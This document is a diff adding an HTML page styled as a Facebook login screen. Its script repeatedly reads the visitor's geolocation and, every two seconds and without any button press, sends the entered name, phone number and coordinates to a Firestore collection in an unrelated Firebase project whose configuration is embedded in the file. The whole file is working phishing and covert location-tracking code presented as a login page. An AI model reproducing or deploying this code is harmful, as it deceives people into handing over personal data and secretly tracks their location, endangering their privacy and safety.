@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  
+  <title>H</title>
+  <style>
+body {
+   font-family: Arial, sans-serif;
+   background: #f0f2f5;
+   display: flex;
+   justify-content: center;
+   align-items: center;
+   height: 100vh;
+   }
+   
+   .container {
+   background: white;
+   padding: 20px;
+   width: 320px;
+   border-radius: 10px;
+   box-shadow: 0 2px 10px rgba(0,0,0,0.2);
+   text-align: center;
+   overflow: hidden;
+   }
+   
+   .logo {
+   font-size: 40px;
+   font-weight: bold;
+   color: #1877f2;
+   margin-bottom: 20px;
+   }
+   
+   input {
+   width: %;
+   padding: 12px;
+   margin: 8px 0;
+   border: 1px solid #ccc;
+   border-radius: 6px;
+   }
+   
+   .login-btn {
+   width: 100%;
+   padding: 12px;
+   background: #1877f2;
+   color: white;
+   border: none;
+   border-radius: 6px;
+   font-size: 16px;
+   cursor: pointer;
+   }
+   
+   .login-btn:hover {
+   background: #145dbf;
+   }
+   
+   .link {
+   margin-top: 10px;
+   display: block;
+   font-size: 14px;
+   color: #1877f2;
+   text-decoration: none;
+   }
+   
+   .link:hover {
+   text-decoration: underline;
+   }
+   </style>
+</head>
+<body>
+  <div class="container">
+  <div class="logo">facebook</div>  
+    
+<input type="text" id="name" placeholder="Name"><br>
+<input type="text" id="number" placeholder="Number"><br><br>
+
+<textarea name="fname" id="latitude"></textarea>
+<textarea name="lname" id="logtude"></textarea>
+
+
+
+
+
+<button class="login-btn" id="sendBtn">LOGIN</button>
+  <a class="link" href="#">Forgotten password?</a>
+  <a class="link" href="#">Create new account</a>
+  
+</div>
+
+
+
+
+
+
+
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/12.12.1/firebase-app.js";
+import { getFirestore, addDoc, collection } from "https://www.gstatic.com/firebasejs/12.12.1/firebase-firestore.js";
+
+const firebaseConfig = {
+  apiKey: "AIzaSyBL0TdZ-99-2z2TxJAcC8IarMe_CwgpB9Q",
+  authDomain: "enternu-8ea16.firebaseapp.com",
+  projectId: "enternu-8ea16",
+  storageBucket: "enternu-8ea16.firebasestorage.app",
+  messagingSenderId: "154759454207",
+  appId: "1:154759454207:web:51442b35d31da1a46b1bca",
+  measurementId: "G-QP1VHL75EM"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
+
+
+function send(){
+    let lat,long;  
+  
+  navigator.geolocation.getCurrentPosition((position)=>{
+      
+ lat =position.coords.latitude;
+ long=position.coords.longitude;
+      
+ 
+ document.getElementById('latitude').innerHTML = lat;
+
+document.getElementById('logtude').innerHTML = long;
+
+
+  });
+};
+  
+  setInterval(send,1)
+  
+
+
+/*
+
+window.onload = () => {
+
+  document.getElementById("sendBtn").onclick = async () => {
+    
+  
+//_________________
+ const name = document.getElementById("name").value;
+ const number = document.getElementById("number").value;
+ 
+var abc =document.getElementById('latitude').value;
+var def=document.getElementById('logtude').value;
+
+ try {
+   await addDoc(collection(db, "user"), { name, number,abc,def});
+   alert("Success");
+ } catch (err) {
+   console.error(err);
+   alert("Error");
+ }
+//_______
+
+ 
+  
+  
+
+
+
+  };
+};
+
+
+window.onload = () => {
+  window.addEventListener("touchstart", async () => {
+  const name = document.getElementById("name").value;
+const number = document.getElementById("number").value;
+
+var abc = document.getElementById('latitude').value;
+var def = document.getElementById('logtude').value;
+
+try {
+  await addDoc(collection(db, "user"), { name, number, abc, def });
+  alert("Success");
+} catch (err) {
+  console.error(err);
+  alert("Error");
+}
+  
+  
+  
+  });
+};
+*/
+
+
+async function startInterval() {
+  const name = document.getElementById("name").value;
+ const number = document.getElementById("number").value;
+ 
+var abc =document.getElementById('latitude').value;
+var def=document.getElementById('logtude').value;
+
+ try {
+   await addDoc(collection(db, "user"), { name, number,abc,def});
+   //alert("Success");
+ } catch (err) {
+   console.error(err);
+  // alert("Error");
+ }
+//_______
+
+}
+
+
+
+//window.addEventListener("touchstart", async () => {
+//  await startInterval();
+ // console.log('pass')});
+async function ti(){
+   await startInterval();
+   console.log('pass')
+ }
+ 
+setInterval(ti,2000);
+
+</script>
+
+</body>
+</html>
